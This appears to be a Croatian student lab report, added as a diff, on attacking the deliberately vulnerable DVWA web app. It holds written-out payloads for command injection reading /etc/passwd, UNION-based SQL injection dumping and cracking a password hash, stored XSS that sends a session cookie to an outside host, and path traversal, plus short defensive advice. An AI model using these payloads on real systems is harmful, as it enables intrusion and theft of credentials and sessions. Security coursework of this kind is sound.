@@ -1,0 +1,50 @@
+1. Upisah "1 | cat /etc/passwd" u "IP address" polje.
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/bin/false
+mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false
+
+
+2. Upisah sljedeće naredbe
+"1' ORDER BY 2#" // prolazi
+"1' ORDER BY 3#" // baca error, znamo da trebamo 2 parametra za UNION
+"1' UNION SELECT first_name, password FROM users WHERE first_name='Pablo' AND last_name='Picasso'#"
+
+Hash je: "0d107d09f5bbe40cade3de5c71e9e9b7".
+Lozinka je "letmein", dobivena pomoću servisa "https://www.md5online.org/md5-decrypt.html".
+
+
+3. Upisah "<script>alert(document.cookie);</script>" u message polje i kliknuo btn "Sign Guestbook" i dobio cookie "PHPSESSID=j5951rf6cfag6jgtgi83b2npg4; security=low"
+PHPSESSID=j5951rf6cfag6jgtgi83b2npg4
+Nakon toga upisah "<script>document.location.href='http://public.tel.fer.hr/sui?cookie=security=low;%20PHPSESSID=j5951rf6cfag6jgtgi83b2npg4</script>" u message polje nakon sto sam u inspectoru promijenio njegov maxLength sa 50 na 150 te sam onda kliknuo btn "Sign Guestbook"
+// http://public.tel.fer.hr/sui?cookie=security=low;%20PHPSESSID=j5951rf6cfag6jgtgi83b2npg4
+
+Za obranu od ovakvog napada postoji nekoliko tehnika:
+1. Izrada tzv. whitelista koje ograničava korisnika što može unijeti (validacija).
+2. Korištenje PHP funkcije 'htmlspecialchars()' ili slične koja sanitizira HTML entitete, npr. "<" će pretvoriti u "&lt".
+
+
+4. Upisah "http://192.168.56.102/vulnerabilities/fi/?page=../../../../../../etc/passwd" u address bar preglednika (slika je priložena u zip arhivi).
+
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/bin/false mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false 
+
+Za obranu od ovakvog napada postoje dvije jednostavne, ali efektivne tehnike:
+1. Korištenje tzv. whiteliste kako bi se osiguralo da php skripta ne može doći do nedopuštenih resursa na poslužitelju.
+2. Korištenje PHP funkcije 'basename()' ili slične koja izdvaja zadnji dio niza nakon posljednjeg znaka '/'. Npr. ako korisnik pokuša koristiti '../etc/passwd', funkcija basename() vratit će 'passwd'.
